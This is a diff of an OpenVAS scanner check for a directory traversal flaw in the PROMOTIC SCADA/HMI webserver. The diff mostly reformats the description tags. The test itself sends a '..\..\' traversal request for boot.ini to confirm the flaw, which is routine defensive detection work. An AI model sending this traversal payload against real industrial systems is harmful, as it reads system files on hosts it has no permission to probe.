@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: gb_promotic_scada_hmi_server_dir_trav_vuln.nasl 9351 2018-04-06 07:05:43Z cfischer $
+# $Id: gb_promotic_scada_hmi_server_dir_trav_vuln.nasl 12010 2018-10-22 08:23:57Z mmartin $
 #
 # PROMOTIC SCADA/HMI Webserver Directory Traversal Vulnerability
 #
@@ -24,35 +24,17 @@
 # Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
 ###############################################################################
 
-tag_impact = "Successful exploitation will allow attacker to obtain sensitive
-information that could aid in further attacks.
-
-Impact Level: Application";
-
-tag_affected = "PROMOTIC SCADA/HMI Server Version 8.1.3, Other versions may
-also be affected.";
-
-tag_insight = "The flaw is due to improper validation of URI containing
-'..\..\' sequences, which allows attackers to read arbitrary files via
-directory traversal attacks.";
-
-tag_solution = "Update to version 8.1.5 or later,
-For updates refer to http://www.promotic.eu/en/promotic/scada-pm.htm";
-
-tag_summary = "The host is running PROMOTIC SCADA/HMI Webserver and is prone to
-directory traversal vulnerability.";
-
 if(description)
 {
   script_oid("1.3.6.1.4.1.25623.1.0.802041");
-  script_version("$Revision: 9351 $");
-  script_tag(name:"last_modification", value:"$Date: 2018-04-06 09:05:43 +0200 (Fri, 06 Apr 2018) $");
+  script_version("$Revision: 12010 $");
+  script_tag(name:"last_modification", value:"$Date: 2018-10-22 10:23:57 +0200 (Mon, 22 Oct 2018) $");
   script_tag(name:"creation_date", value:"2011-10-20 08:43:23 +0200 (Thu, 20 Oct 2011)");
   script_tag(name:"cvss_base", value:"5.0");
   script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
   script_name("PROMOTIC SCADA/HMI Webserver Directory Traversal Vulnerability");
-  script_xref(name : "URL" , value : "http://secunia.com/advisories/46430");
-  script_xref(name : "URL" , value : "http://aluigi.altervista.org/adv/promotic_1-adv.txt");
+  script_xref(name:"URL", value:"http://secunia.com/advisories/46430");
+  script_xref(name:"URL", value:"http://aluigi.altervista.org/adv/promotic_1-adv.txt");
 
   script_tag(name:"qod_type", value:"remote_vul");
   script_category(ACT_ATTACK);
@@ -60,40 +42,37 @@ if(description)
   script_family("Web Servers");
   script_dependencies("http_version.nasl");
   script_require_ports("Services/www", 80);
-  script_tag(name : "impact" , value : tag_impact);
-  script_tag(name : "affected" , value : tag_affected);
-  script_tag(name : "insight" , value : tag_insight);
-  script_tag(name : "solution" , value : tag_solution);
-  script_tag(name : "summary" , value : tag_summary);
+  script_tag(name:"impact", value:"Successful exploitation will allow attacker to obtain sensitive
+information that could aid in further attacks.");
+  script_tag(name:"affected", value:"PROMOTIC SCADA/HMI Server Version 8.1.3, Other versions may
+also be affected.");
+  script_tag(name:"insight", value:"The flaw is due to improper validation of URI containing
+'..\..\' sequences, which allows attackers to read arbitrary files via
+directory traversal attacks.");
+  script_tag(name:"solution", value:"Update to version 8.1.5 or later.");
+  script_tag(name:"solution_type", value:"VendorFix");
+  script_tag(name:"summary", value:"The host is running PROMOTIC SCADA/HMI Webserver and is prone to
+directory traversal vulnerability.");
+  script_xref(name:"URL", value:"http://www.promotic.eu/en/promotic/scada-pm.htm");
   exit(0);
 }
-
-##
-## The script code starts here
-##
 
 include("http_func.inc");
 include("http_keepalive.inc");
 
-## Get HTTP Port
 port = get_http_port(default:80);
 
-## Check Port State
 if(!get_port_state(port)){
   exit(0);
 }
 
-## Send and Receive the response
 req = http_get(item: "/webdir/default.htm", port:port);
 res = http_send_recv(port:port, data:req);
 
-## Confirm the application before trying exploit
 if(">PROMOTIC WEB Server<" >< res && "Server: Pm" >< res)
 {
-  ## Construct attack request
   url = "/webdir/..\..\..\..\..\..\..\..\..\boot.ini";
 
-  ## Try exploit and check the response to confirm vulnerability
   if(http_vuln_check(port:port, url:url, pattern:"\[boot loader\]"))
   {
     security_message(port:port);
